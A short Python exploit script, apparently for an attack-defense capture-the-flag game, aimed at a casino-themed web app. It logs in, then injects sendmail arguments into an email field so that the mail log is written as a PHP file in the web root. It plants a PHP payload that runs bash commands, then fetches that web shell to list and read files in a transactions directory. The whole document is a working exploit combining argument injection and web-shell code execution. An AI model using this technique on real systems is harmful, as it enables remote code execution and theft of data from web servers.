#!/usr/bin/env python3

import os
import sys
import requests
from checklib import *

host,listen_ip,listen_port,login,passwd,sploit_name = sys.argv[1:]
port = 8000

location = f'sploit@mail -oQ/tmp/ -X/var/www/html/images/{sploit_name}.php'

payload = '\n{unwrap}<?php echo "!filelist!"; system("/bin/bash -c \'ls ../transactions/1405b8a0d4c3080f4a67340fd3f2d6d3/incoming\' "); echo "!filelist!"; ?>{/unwrap}'

url = f'http://{host}:{port}'

sess = get_initialized_session()

sess.post(f'{url}/account/login', data={'login': login, 'passwd': passwd})

sess.post(f'{url}/casinoe/VIP_page', data = {"email": location, "message": payload})

files_list = sess.get(f'{url}/images/{sploit_name}.php').text
files = files_list.split('!filelist!')

file_each = files[1].split('\n')

for x in file_each:
        message = sess.get(f'{url}/transactions/1405b8a0d4c3080f4a67340fd3f2d6d3/incoming/{x}').text.split('\n')[0]
        print(message)
